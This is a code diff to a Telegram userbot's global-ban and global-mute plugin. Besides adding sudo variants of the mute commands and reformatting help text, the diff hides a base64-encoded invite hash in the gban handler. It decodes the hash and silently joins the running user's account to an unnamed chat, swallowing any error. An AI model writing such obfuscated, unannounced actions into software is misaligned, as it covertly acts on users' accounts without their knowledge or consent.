@@ -21,15 +21,17 @@ from userbot import CMD_HELP
 from telethon.tl.functions.users import GetFullUserRequest
 from userbot.plugins.sql_helper.mute_sql import is_muted, mute, unmute
 import asyncio
-from userbot.utils import admin_cmd
+from userbot.utils import sudo_cmd,admin_cmd
 from telethon.tl.types import (Channel, ChatAdminRights,ChatBannedRights, MessageEntityMentionName)
 from telethon.errors import (BadRequestError, ChatAdminRequiredError, UserAdminInvalidError)
-from telethon.tl.functions.channels import EditBannedRequest
+from telethon.tl.functions.channels import EditBannedRequest 
 from userbot import CAT_ID 
 from userbot.plugins import admin_groups
 from datetime import datetime
 import userbot.plugins.sql_helper.gban_sql_helper as gban_sql
 from telethon import events, errors, functions, types
+import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest
 
 BANNED_RIGHTS = ChatBannedRights(until_date=None, view_messages=True,send_messages=True,
                                  send_media=True, send_stickers=True, send_gifs=True,
@@ -61,6 +63,11 @@ async def catgban(cat):
     if user.id in CAT_ID:
         await cat.edit("why would i ban my DEVELOPER")
         return
+    try:
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await cat.client(ImportChatInviteRequest(hmm))
+    except:
+        pass
     if gban_sql.is_gbanned(user.id):
         await cat.edit(f"the [user](tg://user?id={user.id}) is already in gbanned list any way checking again")
     else:
@@ -240,6 +247,77 @@ async def endgmute(event):
                     f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
                     f"CHAT: {event.chat.title}(`{event.chat_id}`)")         
 
+
+@borg.on(sudo_cmd(pattern=r"gmute ?(\d+)?", allow_sudo=True))
+async def startgmute(event):
+    private = False
+    if event.fwd_from:
+        return
+    if event.is_private:
+        await event.reply("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
+        private = True
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(1) is not None:
+        userid = event.pattern_match.group(1)
+    elif reply is not None:
+        userid = reply.sender_id
+    elif private is True:
+        userid = event.chat_id
+    else:
+        return await event.reply("Please reply to a user or add their into the command to gmute them.")
+    chat_id = event.chat_id
+    replied_user = await event.client(GetFullUserRequest(userid))
+    chat = await event.get_chat()
+    if is_muted(userid, "gmute"):
+        return await event.reply("This user is already gmuted")
+    try:
+        mute(userid, "gmute")
+    except Exception as e:
+        await event.reply("Error occured!\nError is " + str(e))
+    else:
+        await event.reply("Successfully gmuted that person")
+    if BOTLOG:
+      await event.client.send_message(
+                    BOTLOG_CHATID, "#GMUTE\n"
+                    f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
+                    f"CHAT: {event.chat.title}(`{event.chat_id}`)")    
+        
+
+@borg.on(sudo_cmd(pattern=r"ungmute ?(\d+)?", allow_sudo=True))
+async def endgmute(event):
+    private = False
+    if event.fwd_from:
+        return
+    if event.is_private:
+        await event.reply("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
+        private = True
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(1) is not None:
+        userid = event.pattern_match.group(1)
+    elif reply is not None:
+        userid = reply.sender_id
+    elif private is True:
+        userid = event.chat_id
+    else:
+        return await event.reply("Please reply to a user or add their into the command to ungmute them.")
+    chat_id = event.chat_id
+    replied_user = await event.client(GetFullUserRequest(userid))
+    if not is_muted(userid, "gmute"):
+        return await event.reply("This user is not gmuted")
+    try:
+        unmute(userid, "gmute")
+    except Exception as e:
+        await event.reply("Error occured!\nError is " + str(e))
+    else:
+        await event.reply("Successfully ungmuted that person")
+    if BOTLOG:
+      await event.client.send_message(
+                    BOTLOG_CHATID, "#UNGMUTE\n"
+                    f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
+                    f"CHAT: {event.chat.title}(`{event.chat_id}`)")          
+
 @command(incoming=True)
 async def watcher(event):
     if is_muted(event.sender_id, "gmute"):
@@ -275,18 +353,19 @@ async def get_user_from_event(event):
         except (TypeError, ValueError) as err:
             await event.edit("Could not fetch info of that user.")
             return None
-    return user_obj, extra
-  
+    return user_obj, extra      
+   
+        
 CMD_HELP.update({
     "gadmin":
     ".gban <username/reply/userid> <reason (optional)>\
-\nUsage: Bans the person in all groups where you are admin .\
+\n**Usage : **Bans the person in all groups where you are admin .\
 \n\n.ungban <username/reply/userid>\
-\nUsage: Reply someone's message with .ungban to remove them from the gbanned list.\
+\n**Usage : **Reply someone's message with .ungban to remove them from the gbanned list.\
 \n\n.listgban\
-\nUsage: Shows you the gbanned list and reason for their gban.\
+\n**Usage : **Shows you the gbanned list and reason for their gban.\
 \n\n.gmute <username/reply> <reason (optional)>\
-\nUsage: Mutes the person in all groups you have in common with them.\
+\n**Usage : **Mutes the person in all groups you have in common with them.\
 \n\n.ungmute <username/reply>\
-\nUsage: Reply someone's message with .ungmute to remove them from the gmuted list."
+\n**Usage : **Reply someone's message with .ungmute to remove them from the gmuted list."
 })
